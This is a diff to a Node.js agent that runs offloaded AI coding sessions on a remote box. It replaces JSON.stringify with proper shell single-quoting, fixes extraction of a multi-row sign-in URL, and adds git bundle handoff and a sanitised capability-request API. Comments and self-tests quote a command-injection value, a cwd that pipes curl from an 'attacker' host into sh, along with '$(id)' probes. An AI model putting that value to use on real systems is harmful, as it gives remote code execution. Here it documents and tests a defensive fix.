@@ -103,7 +103,24 @@ if (process.argv.includes('--self-test')) {
   assert.notEqual(missionManifestHmac('secret', manifest), missionManifestHmac('other', manifest));
   assert.equal(isLoopbackHost('127.0.0.1'), true);
   assert.equal(isLoopbackHost('0.0.0.0'), false);
+  // Shell quoting. `JSON.stringify` was used here and leaves `$` and backtick
+  // live inside the double-quoted `bash -lc` string: a session request with
+  // cwd `/tmp/x$(curl -s http://attacker/p|sh)` ran as root on this box.
+  assert.equal(shq("/tmp/x"), "'/tmp/x'");
+  assert.equal(shq("/tmp/x$(id)"), "'/tmp/x$(id)'");
+  assert.equal(shq("/tmp/x`id`"), "'/tmp/x`id`'");
+  assert.equal(shq("/tmp/it's"), "'/tmp/it'\\''s'");
+  for (const evil of ['/tmp/x$(id)', '/tmp/x`id`', '/tmp/x"; id; "', "/tmp/x'; id; '"]) {
+    const quoted = shq(evil);
+    // Everything between the outer quotes must be inert: the only single quote
+    // allowed inside is the closing/reopening dance.
+    assert.ok(quoted.startsWith("'") && quoted.endsWith("'"), `not wrapped: ${quoted}`);
+    assert.ok(!/[^\\]'[^\\]/.test(quoted.slice(1, -1).replaceAll("'\\''", '')),
+      `unescaped quote survives in ${quoted}`);
+  }
+
   console.log('throttle edge mission contract: ok');
+  console.log('throttle edge shell quoting: ok');
   process.exit(0);
 }
 
@@ -203,10 +220,37 @@ async function authStart() {
   return { ok: true };
 }
 
+/// Rebuild the sign-in URL from a tmux pane.
+///
+/// A single regex over the capture returns the first third of it. Claude Code
+/// prints the URL across several pane rows, and `capture-pane -J` does not join
+/// them — it only rejoins lines TMUX wrapped, not lines the application emitted.
+/// The result looked like a URL, was returned as a URL, and led nowhere; the
+/// only way to authenticate the box was to reassemble it by hand.
+///
+/// A URL continues onto the next row when that row has no spaces and is not
+/// blank — wrapped continuations never do, and the prose around them always
+/// does.
+function extractAuthURL(pane) {
+  const lines = pane.split('\n').map(l => l.replace(/\s+$/, ''));
+  for (let i = 0; i < lines.length; i++) {
+    const start = lines[i].match(/https:\/\/\S+$/);
+    if (!start) continue;
+    let url = start[0];
+    for (let j = i + 1; j < lines.length; j++) {
+      const next = lines[j].trim();
+      if (!next || /\s/.test(next)) break;
+      url += next;
+    }
+    return url;
+  }
+  return null;
+}
+
 async function authPeek() {
   const pane = await sh('tmux', ['capture-pane', '-t', AUTH_SESSION, '-p', '-J', '-S', '-200']);
   if (pane === null) return { running: false, url: null, done: claudeAuthReady() };
-  const url = (pane.match(/https:\/\/\S+/g) || []).pop() || null;
+  const url = extractAuthURL(pane);
   // setup-token prints the minted token on success — persist it and clean up.
   const tok = (pane.match(/sk-ant-oat[0-9A-Za-z_-]+/g) || []).pop() || null;
   if (tok) {
@@ -231,8 +275,20 @@ function persistOAuthToken(tok) {
   fs.chmodSync(OAUTH_TOKEN_PATH, 0o600);
 }
 
+/// Single-quote a value for POSIX sh. Inside single quotes nothing expands, so
+/// this is the only safe way to put an attacker-influenced string into a shell
+/// command line.
+///
+/// `JSON.stringify` was used for this and is NOT equivalent: it escapes `"` and
+/// `\\` but leaves `$` and backtick untouched, and the result landed inside
+/// DOUBLE quotes where command substitution is still live. A session request
+/// with cwd `/tmp/x$(curl -s http://attacker/p|sh)` executed as root on the box.
+function shq(value) {
+  return `'${String(value).replaceAll("'", "'\\''")}'`;
+}
+
 function oauthShellPrefix() {
-  const file = `'${OAUTH_TOKEN_PATH.replaceAll("'", "'\\''")}'`;
+  const file = shq(OAUTH_TOKEN_PATH);
   return `if [ -r ${file} ]; then CLAUDE_CODE_OAUTH_TOKEN="$(cat ${file})"; export CLAUDE_CODE_OAUTH_TOKEN; fi;`;
 }
 
@@ -289,6 +345,52 @@ function usageFor(cwd) {
   } catch { return { tokens: null, model: null }; }
 }
 
+
+// Bytes of the newest transcript for a working directory, across both harnesses.
+// Best-effort: a missing file is not an error, it means the session has not
+// written anything yet.
+function transcriptBytesFor(cwd) {
+  const candidates = [];
+  const codexRoot = path.join(HOME_DIR, '.codex', 'sessions');
+  const claudeRoot = path.join(HOME_DIR, '.claude', 'projects');
+  const walk = (dir, depth = 0) => {
+    if (depth > 6) return;
+    let entries;
+    try { entries = fs.readdirSync(dir, { withFileTypes: true }); } catch { return; }
+    for (const e of entries) {
+      const full = path.join(dir, e.name);
+      if (e.isDirectory()) walk(full, depth + 1);
+      else if (e.name.endsWith('.jsonl')) {
+        try {
+          const st = fs.statSync(full);
+          candidates.push({ full, size: st.size, mtime: st.mtimeMs });
+        } catch { /* raced with a delete */ }
+      }
+    }
+  };
+  walk(codexRoot);
+  walk(claudeRoot);
+  if (!candidates.length) return null;
+  // Newest wins: the session writing right now is the one that matters.
+  candidates.sort((a, b) => b.mtime - a.mtime);
+  return candidates[0].size;
+}
+
+// How much memory this container actually has, so the Mac can judge a transcript
+// against the machine holding it rather than against a constant.
+let memTotalCache = null;
+function containerMemoryTotal() {
+  if (memTotalCache !== null) return memTotalCache;
+  for (const p of ['/sys/fs/cgroup/memory.max', '/sys/fs/cgroup/memory/memory.limit_in_bytes']) {
+    try {
+      const raw = fs.readFileSync(p, 'utf8').trim();
+      if (raw && raw !== 'max') { memTotalCache = Number(raw); return memTotalCache; }
+    } catch { /* not this cgroup layout */ }
+  }
+  memTotalCache = os.totalmem();
+  return memTotalCache;
+}
+
 async function listSessions() {
   const live = await tmuxList();
   return live.map(s => {
@@ -303,6 +405,14 @@ async function listSessions() {
       model: u.model,
       tokens: u.tokens,
       startedAt: s.created,
+      // The size of the transcript this session is holding. A harness keeps its
+      // rollout in memory, so on a small container this number, not the token
+      // count, is what decides whether the session survives: measured
+      // 2026-08-22, a codex rollout reached 275 MB here and the OOM killer took
+      // the session and this unit with it. Reported so the Mac can warn while
+      // there is still time to act.
+      transcriptBytes: meta.cwd ? transcriptBytesFor(meta.cwd) : null,
+      memoryTotalBytes: containerMemoryTotal(),
     };
   });
 }
@@ -342,14 +452,14 @@ async function startSession({ project, cwd, resume, runtime }) {
   const bin = kind === 'codex' ? CODEX_CMD : CLAUDE_CMD;
   const launch = resume
     ? (kind === 'codex'
-        ? `${bin} resume ${JSON.stringify(resume)}`
-        : `${bin} --resume ${JSON.stringify(resume)}`)
+        ? `${bin} resume ${shq(resume)}`
+        : `${bin} --resume ${shq(resume)}`)
     : bin;
   // mkdir -p the cwd first: an offloaded session names a project dir that may not
   // exist yet on this box (the Mac had it, we don't). Without this `cd` fails and
   // the tmux session dies on launch — the transcript was uploaded but claude never
   // starts. Creating it is the sane "run a session here" behaviour.
-  const inner = `mkdir -p ${JSON.stringify(cwd)} && cd ${JSON.stringify(cwd)} && ${oauthShellPrefix()} exec ${launch}`;
+  const inner = `mkdir -p ${shq(cwd)} && cd ${shq(cwd)} && ${oauthShellPrefix()} exec ${launch}`;
   // Spawn the tmux server in its OWN transient systemd scope, NOT in this agent's
   // service cgroup. Under systemd, a tmux server forked directly by the agent lives
   // in throttle-agent.service's control group and gets reaped almost immediately
@@ -778,10 +888,204 @@ async function receiveRepo(req, url) {
   try {
     const args = branch === 'HEAD' ? ['clone', tmp, cwd] : ['clone', '-b', branch, tmp, cwd];
     await execFileP('git', args);
-    return { ok: true, cwd, branch };
+    // A clone takes branches and tags; it ignores refs/throttle/wip, which is
+    // where the Mac's uncommitted work travels. Fetch it explicitly and apply it
+    // to the fresh worktree, so a session handed over mid-edit continues from
+    // what was on screen rather than from the last commit.
+    let wipApplied = false;
+    try {
+      await execFileP('git', ['-C', cwd, 'fetch', '--quiet', tmp,
+                              '+refs/throttle/wip:refs/throttle/wip']);
+      // The ref is a plain snapshot commit, not a stash, so `stash apply` does
+      // not apply. Checking its tree out over a freshly cloned worktree cannot
+      // conflict with anything, then unstaging leaves the files modified exactly
+      // as they were on the other machine.
+      await execFileP('git', ['-C', cwd, 'checkout', 'refs/throttle/wip', '--', '.']);
+      await execFileP('git', ['-C', cwd, 'reset', '--quiet']);
+      wipApplied = true;
+    } catch { /* nothing was in flight, or it did not apply — the commits are there */ }
+    return { ok: true, cwd, branch, wipApplied };
   } finally {
     fs.rmSync(tmp, { force: true });
   }
+}
+
+// A commit holding everything not yet committed — modified tracked files AND new
+// untracked ones — without disturbing the repository.
+//
+// `git stash create` was the obvious tool and is the wrong one: it silently drops
+// untracked files, and ignores `-u` when asked to include them. A handoff that
+// loses every newly created file is worse than no handoff, because the loss is
+// invisible until someone goes looking for the file.
+//
+// Writing through a TEMPORARY index is what makes this safe: `git add -A` stages
+// into a throwaway file, so the real index and working tree are untouched and the
+// session keeps running exactly as it was. Ignored paths stay ignored.
+async function snapshotWorkInProgress(cwd) {
+  const idx = path.join(os.tmpdir(), `throttle-index-${crypto.randomBytes(6).toString('hex')}`);
+  const env = { ...process.env, GIT_INDEX_FILE: idx };
+  try {
+    await execFileP('git', ['-C', cwd, 'read-tree', 'HEAD'], { env });
+    await execFileP('git', ['-C', cwd, 'add', '-A', '.'], { env });
+    // Ignored files the user declared as necessary: `.env`, certificates,
+    // fixtures. Opt-in only — they are ignored because they are local, and some
+    // are secrets. Naming one here is the user saying it may leave the machine.
+    try {
+      const list = fs.readFileSync(path.join(cwd, '.throttleinclude'), 'utf8');
+      for (const line of list.split('\n').map(l => l.trim())) {
+        if (!line || line.startsWith('#')) continue;
+        await execFileP('git', ['-C', cwd, 'add', '-f', '--', line], { env }).catch(() => {});
+      }
+    } catch { /* no include list, which is the normal case */ }
+    const { stdout: tree } = await execFileP('git', ['-C', cwd, 'write-tree'], { env });
+    const t = tree.trim();
+    const { stdout: head } = await execFileP('git', ['-C', cwd, 'rev-parse', 'HEAD^{tree}']);
+    if (!t || t === head.trim()) return null;   // nothing in flight
+    const { stdout: c } = await execFileP('git', ['-C', cwd, 'commit-tree', t, '-p', 'HEAD',
+                                                  '-m', 'Throttle handoff: work in progress']);
+    return c.trim() || null;
+  } catch {
+    return null;
+  } finally {
+    fs.rmSync(idx, { force: true });
+  }
+}
+
+// Bring-back for CODE, symmetric to `receiveRepo`. The offload ships the repo
+// out as a bundle; without this the reverse trip carried only the conversation,
+// so a session could report work that existed nowhere the user could reach.
+//
+// A bundle rather than a diff or a tarball: it is one file, it carries real
+// commits with their history, and `git fetch <bundle>` on the other side is an
+// ordinary fetch — no patch application, no conflict resolution, nothing that
+// can damage the Mac's working tree.
+//
+// Uncommitted work on the box is included as its own ref. `git stash create`
+// builds a commit object from the index and worktree WITHOUT touching either,
+// so the box keeps working exactly as it was while the Mac still receives what
+// was in flight. Losing that is the failure this whole feature exists to
+// prevent.
+async function sendRepoBundle(req, res, url) {
+  const cwd = url.searchParams.get('cwd');
+  if (!cwd || !cwd.startsWith('/')) throw new Error('cwd (absolute) required');
+  if (!fs.existsSync(path.join(cwd, '.git'))) {
+    const err = new Error('not a git repository'); err.code = 404; throw err;
+  }
+
+  // Capture in-flight work as a ref the bundle can carry.
+  let wip = null;
+  try {
+    wip = await snapshotWorkInProgress(cwd);
+    if (wip) await execFileP('git', ['-C', cwd, 'update-ref', 'refs/throttle/wip', wip]);
+    else await execFileP('git', ['-C', cwd, 'update-ref', '-d', 'refs/throttle/wip']).catch(() => {});
+  } catch { /* nothing in flight — the commits still go */ }
+
+  const tmp = path.join(os.tmpdir(), `throttle-out-${crypto.randomBytes(4).toString('hex')}.bundle`);
+  try {
+    await execFileP('git', ['-C', cwd, 'bundle', 'create', tmp, '--all']);
+    const stat = fs.statSync(tmp);
+    res.writeHead(200, {
+      'content-type': 'application/octet-stream',
+      'content-length': String(stat.size),
+      // The Mac needs to know whether in-flight work is inside, and which commit
+      // it is, without parsing the bundle.
+      'x-throttle-wip': wip || '',
+    });
+    await new Promise((resolve, reject) => {
+      const rs = fs.createReadStream(tmp);
+      rs.on('error', reject); res.on('error', reject); res.on('finish', resolve);
+      rs.pipe(res);
+    });
+  } finally {
+    fs.rmSync(tmp, { force: true });
+  }
+}
+
+
+// ---------------------------------------------------------------------------
+// Capability requests — the box asking the Mac to do what only the Mac can do.
+//
+// A session offloaded here has no Xcode, no simulators, no signing identity and
+// no macOS. Today that means the work simply stops at the point it needs them.
+// This lets the session ask for a NAMED CAPABILITY instead: "build", "test",
+// "sign". The Mac decides what command that maps to.
+//
+// The distinction is the entire security model. A remote session that could send
+// a command string to the Mac would be a shell on the Mac, reachable from a
+// machine that is by definition less trusted than the laptop. A session that can
+// only name a capability gets a build — nothing else — even if it is fully
+// compromised. Arguments are a bounded map of scalars, never a command line.
+const CAPABILITY_ROOT = path.join(MISSION_ROOT, '..', 'capabilities');
+const CAPABILITIES = new Set(['build', 'test', 'lint', 'sign']);
+const CAP_MAX_ARGS = 12;
+
+function capPath(id) { return path.join(CAPABILITY_ROOT, `${id}.json`); }
+
+function capRead(id) {
+  try { return JSON.parse(fs.readFileSync(capPath(id), 'utf8')); } catch { return null; }
+}
+
+function capWrite(rec) {
+  fs.mkdirSync(CAPABILITY_ROOT, { recursive: true });
+  fs.writeFileSync(capPath(rec.id), JSON.stringify(rec, null, 2));
+  return rec;
+}
+
+// Arguments are scalars only, and short. A capability request is a description
+// of intent, not a payload — anything long enough to smuggle a script in is
+// rejected rather than truncated, so the refusal is visible.
+function capSanitizeArgs(raw) {
+  const out = {};
+  if (raw && typeof raw === 'object' && !Array.isArray(raw)) {
+    for (const [k, v] of Object.entries(raw)) {
+      if (Object.keys(out).length >= CAP_MAX_ARGS) break;
+      if (!/^[a-zA-Z][a-zA-Z0-9_-]{0,31}$/.test(k)) continue;
+      if (typeof v === 'number' || typeof v === 'boolean') { out[k] = v; continue; }
+      if (typeof v === 'string' && v.length <= 128 && !/[\n\r\0]/.test(v)) out[k] = v;
+    }
+  }
+  return out;
+}
+
+function capCreate({ capability, repo, args, session }) {
+  if (!CAPABILITIES.has(capability)) {
+    const e = new Error(`unknown capability '${capability}' — known: ${[...CAPABILITIES].join(', ')}`);
+    e.code = 400; throw e;
+  }
+  if (typeof repo !== 'string' || !/^[A-Za-z0-9._-]{1,64}$/.test(repo)) {
+    const e = new Error('repo must be a plain mirror name'); e.code = 400; throw e;
+  }
+  return capWrite({
+    id: crypto.randomUUID(),
+    capability, repo,
+    args: capSanitizeArgs(args),
+    session: typeof session === 'string' ? session.slice(0, 64) : null,
+    state: 'pending',
+    requestedAt: new Date().toISOString(),
+  });
+}
+
+function capPending() {
+  try {
+    return fs.readdirSync(CAPABILITY_ROOT)
+      .filter((f) => f.endsWith('.json'))
+      .map((f) => { try { return JSON.parse(fs.readFileSync(path.join(CAPABILITY_ROOT, f), 'utf8')); } catch { return null; } })
+      .filter((r) => r && r.state === 'pending');
+  } catch { return []; }
+}
+
+// The Mac reports back. Output is capped here as well as on the Mac: a failing
+// build can emit megabytes, and the whole point of the session being on the box
+// is that its context is not free.
+function capComplete(id, { exitCode, output, error }) {
+  const rec = capRead(id);
+  if (!rec) { const e = new Error('no such capability request'); e.code = 404; throw e; }
+  rec.state = error ? 'failed' : 'completed';
+  rec.exitCode = Number.isInteger(exitCode) ? exitCode : null;
+  rec.output = typeof output === 'string' ? output.slice(-64_000) : '';
+  rec.error = error ? String(error).slice(0, 2_000) : null;
+  rec.completedAt = new Date().toISOString();
+  return capWrite(rec);
 }
 
 const server = http.createServer(async (req, res) => {
@@ -799,6 +1103,23 @@ const server = http.createServer(async (req, res) => {
   }
   if (!authed(req)) return send(res, 401, { error: 'unauthorized' });
   try {
+    if (p === '/capabilities' && req.method === 'POST') {
+      try { return send(res, 201, capCreate(await body(req))); }
+      catch (e) { return send(res, e.code === 400 ? 400 : 500, { error: String(e.message || e) }); }
+    }
+    if (p === '/capabilities/pending' && req.method === 'GET') {
+      return send(res, 200, { requests: capPending() });
+    }
+    const cap = p.match(/^\/capabilities\/([a-f0-9-]{36})$/);
+    if (cap && req.method === 'GET') {
+      const rec = capRead(cap[1]);
+      return rec ? send(res, 200, rec) : send(res, 404, { error: 'no such capability request' });
+    }
+    const capResult = p.match(/^\/capabilities\/([a-f0-9-]{36})\/result$/);
+    if (capResult && req.method === 'POST') {
+      try { return send(res, 200, capComplete(capResult[1], await body(req))); }
+      catch (e) { return send(res, e.code === 404 ? 404 : 500, { error: String(e.message || e) }); }
+    }
     if (p === '/mcp' && req.method === 'POST') return await handleMCP(req, res);
     if (p === '/auth/start' && req.method === 'POST') return send(res, 200, await authStart());
     if (p === '/auth/peek' && req.method === 'GET') return send(res, 200, await authPeek());
@@ -839,6 +1160,10 @@ const server = http.createServer(async (req, res) => {
       catch (e) { return send(res, e.code === 409 ? 409 : 500, { error: String(e.message || e) }); }
     }
     if (p === '/transcripts' && req.method === 'PUT') { const r = await receiveTranscript(req, url); return send(res, 201, r); }
+    if (p === '/repos' && req.method === 'GET') {
+      try { return await sendRepoBundle(req, res, url); }
+      catch (e) { return send(res, e.code === 404 ? 404 : 500, { error: String(e.message || e) }); }
+    }
     if (p === '/repos' && req.method === 'PUT') {
       try { const r = await receiveRepo(req, url); return send(res, 201, r); }
       catch (e) { return send(res, e.code === 409 ? 409 : 500, { error: String(e.message || e) }); }
